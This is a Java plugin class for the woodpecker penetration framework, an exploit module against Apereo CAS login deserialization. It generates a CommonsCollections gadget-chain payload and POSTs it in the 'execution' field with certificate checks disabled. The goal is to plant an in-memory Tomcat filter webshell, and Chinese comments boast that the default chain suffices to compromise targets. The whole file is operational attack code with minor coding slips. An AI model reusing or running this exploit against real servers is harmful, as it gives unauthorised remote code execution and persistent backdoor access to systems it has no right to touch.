package me.gv7.woodpecker.plugin.exploits;

import me.gv7.woodpecker.plugin.*;
import net.dongliu.requests.Requests;

import javax.swing.*;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class CasExploit implements IExploit {

    public void basicInfoPrint(String targetURL, Map<String, String> customArgs, JTextArea taResult){
        String gadge = customArgs.get("gadge");
        String shellType = customArgs.get("shell_type");
        taResult.setText("目标URL: "+targetURL+"\n");
        taResult.setText("利用链: "+gadge+"\n");
        taResult.setText("shell类型: "+shellType+"\n");
    }



    @Override
    public String getExploitTabCaption() {
        return "Cas 反序列化";
    }

    @Override
    public IArgsUsageBinder getExploitCustomArgs() {
        IArgsUsageBinder binder = CasRCE.callbacks.getPluginHelper().createArgsUsageBinder();
        List<IArg> args = new ArrayList<>();
        final IArg gadge = CasRCE.callbacks.getPluginHelper().createArg();
        gadge.setName("gadge");
        gadge.setDefaultValue("CommonsCollections4");
        gadge.setRequired(true);
        gadge.setDescription("cc链，默认用cc4就能打死");

        final IArg shellType = CasRCE.callbacks.getPluginHelper().createArg();
        shellType.setName("command");
        shellType.setDefaultValue("TomcatFilterWebshell");
        gadge.setRequired(true);
        gadge.setDescription("以后会添加spring的内存马");

        args.add(gadge);
        args.add(shellType);
        binder.setArgsList(args);
        binder.setUsage("gadge=URLDNS\nshell_type=http://www.baidu.com");
        return binder;

    }


    @Override
    public void doExploit(ITarget url, Map<String, Object> args, IResultOutput result) {
        String httpAddress = CasCommonUtils.checkUrl(url.getAddress());
        String gadge = (String)args.get("gadge");
        String command = (String)args.get("command");

        result.rawPrintln("\n\n调用类: "+gadge+"\ncommand: "+command+"\n");

        try {
            if (CasCommonUtils.basicCheckVuln(httpAddress, result)){
                String payload = CasCommonUtils.generate(gadge, command);
                Map<String,String> requestBody = new HashMap<>();
                requestBody.put("execution", payload);
                Requests.post(httpAddress).verify(false).body(requestBody).send();
                result.successPrintln("发送成功,请手工验证");
            }
        }catch (Exception e){
            result.errorPrintln(e.getMessage());
        }
    }
}
